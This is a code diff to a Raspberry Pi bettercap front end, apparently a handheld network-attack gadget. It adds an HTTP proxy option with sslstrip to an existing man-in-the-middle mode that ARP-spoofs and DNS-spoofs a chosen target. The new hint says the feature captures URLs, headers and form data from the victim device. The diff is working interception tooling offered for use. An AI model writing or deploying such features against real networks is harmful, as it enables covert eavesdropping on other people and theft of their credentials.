@@ -168,6 +168,10 @@ button{{margin-top:24px;width:100%;padding:12px;background:#0a6;color:#fff;borde
 <label>DNS Redirect IP</label>
 <input type="text" name="mitm_dns_address" value="{v('mitm_dns_address')}">
 <div class="hint">Where hijacked DNS queries point (leave blank to use this Pi&apos;s IP)</div>
+<div class="row">
+<input type="checkbox" name="mitm_http_proxy" value="true" {"checked" if cfg.get("mitm_http_proxy", False) else ""}>
+<span style="font-size:13px">Enable HTTP Proxy (intercept &amp; log plain HTTP traffic)</span></div>
+<div class="hint">Captures URLs, headers, and form data from unencrypted HTTP on the target device. View captured data at SSH or bettercap API /api/events</div>
 </div>
 <button type="submit">&#128190; Save Config</button>
 </form></body></html>"""
@@ -263,6 +267,7 @@ def launch_settings_portal(lcd):
             cfg['mitm_target']      = get('mitm_target').strip()
             cfg['mitm_dns_domains'] = get('mitm_dns_domains').strip()
             cfg['mitm_dns_address'] = get('mitm_dns_address').strip()
+            cfg['mitm_http_proxy']  = (get('mitm_http_proxy') == 'true')
 
             with open(_CONFIG_PATH, 'w') as f:
                 json.dump(cfg, f, indent=4)
@@ -406,7 +411,7 @@ _BC_DASH_SCRIPT = '/home/coreymillia/MESH_CHATBOT/bc_dashboard.py'
 # ── MITM helpers ─────────────────────────────────────────────────────────────
 _MITM_CAP = '/tmp/pibot-mitm.cap'
 
-def _generate_mitm_cap(target, dns_domains, dns_address, local_ip):
+def _generate_mitm_cap(target, dns_domains, dns_address, local_ip, http_proxy=False):
     lines = [
         f'set arp.spoof.targets {target}',
         'set arp.spoof.internal true',
@@ -419,6 +424,12 @@ def _generate_mitm_cap(target, dns_domains, dns_address, local_ip):
             f'set dns.spoof.domains {dns_domains}',
             f'set dns.spoof.address {redirect}',
             'dns.spoof on',
+        ]
+    if http_proxy:
+        lines += [
+            'set http.proxy.port 8888',
+            'set http.proxy.sslstrip true',
+            'http.proxy on',
         ]
     lines += [
         'set api.rest.username user',
@@ -440,7 +451,7 @@ def _set_ip_forward(enable: bool):
         print(f'[MITM] ip_forward: {e}')
 
 
-def _draw_mitm_screen(lcd, target, dns_on, local_ip):
+def _draw_mitm_screen(lcd, target, dns_on, http_proxy_on, local_ip):
     img  = Image.new('RGB', (128, 128), (0, 0, 0))
     draw = ImageDraw.Draw(img)
     f9b  = _font(_FONT_PATH_BOLD, 9)
@@ -451,12 +462,14 @@ def _draw_mitm_screen(lcd, target, dns_on, local_ip):
     draw.text((4, 22), 'Target:', font=f7, fill=(180, 180, 180))
     draw.text((4, 32), target or '(none set)', font=f8, fill=(255, 80, 80))
     draw.text((4, 46), 'ARP Spoof: ON', font=f7, fill=(80, 255, 80))
-    dns_col = (80, 255, 80) if dns_on else (100, 100, 100)
-    draw.text((4, 57), f'DNS Spoof: {"ON" if dns_on else "OFF"}', font=f7, fill=dns_col)
-    draw.line([(4, 70), (124, 70)], fill=(60, 60, 60))
-    draw.text((4, 74), f'JOY\u2190 = stop MITM', font=f7, fill=(200, 200, 0))
-    draw.text((4, 84), f'KEY = exit mode', font=f7, fill=(150, 150, 150))
-    draw.text((4, 100), f'{local_ip}:8082', font=f8, fill=(0, 180, 255))
+    dns_col   = (80, 255, 80)  if dns_on        else (100, 100, 100)
+    proxy_col = (80, 255, 80)  if http_proxy_on else (100, 100, 100)
+    draw.text((4, 57), f'DNS Spoof: {"ON" if dns_on else "OFF"}',         font=f7, fill=dns_col)
+    draw.text((4, 68), f'HTTP Proxy: {"ON :8888" if http_proxy_on else "OFF"}', font=f7, fill=proxy_col)
+    draw.line([(4, 80), (124, 80)], fill=(60, 60, 60))
+    draw.text((4, 84), f'JOY\u2190 = stop MITM', font=f7, fill=(200, 200, 0))
+    draw.text((4, 94), f'KEY = exit mode',   font=f7, fill=(150, 150, 150))
+    draw.text((4, 108), f'{local_ip}:8082',  font=f8, fill=(0, 180, 255))
     lcd.LCD_ShowImage(img, 0, 0)
 
 
@@ -512,19 +525,20 @@ def launch_bettercap(lcd):
                 target     = cfg.get('mitm_target', '').strip()
                 dns_dom    = cfg.get('mitm_dns_domains', '').strip()
                 dns_addr   = cfg.get('mitm_dns_address', '').strip()
+                http_proxy = cfg.get('mitm_http_proxy', False)
                 if target:
                     subprocess.run(['systemctl', 'stop', 'bettercap.service'],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     time.sleep(1)
-                    _generate_mitm_cap(target, dns_dom, dns_addr, local_ip)
+                    _generate_mitm_cap(target, dns_dom, dns_addr, local_ip, http_proxy)
                     _set_ip_forward(True)
                     mitm_proc = subprocess.Popen(
                         ['/usr/bin/bettercap', '-no-colors', '-caplet', _MITM_CAP],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                     )
                     mitm_on = True
-                    _draw_mitm_screen(lcd, target, bool(dns_dom), local_ip)
-                    print(f'[MITM] started → target={target}')
+                    _draw_mitm_screen(lcd, target, bool(dns_dom), http_proxy, local_ip)
+                    print(f'[MITM] started → target={target} http_proxy={http_proxy}')
             else:
                 # Stop MITM, restore passive
                 if mitm_proc:
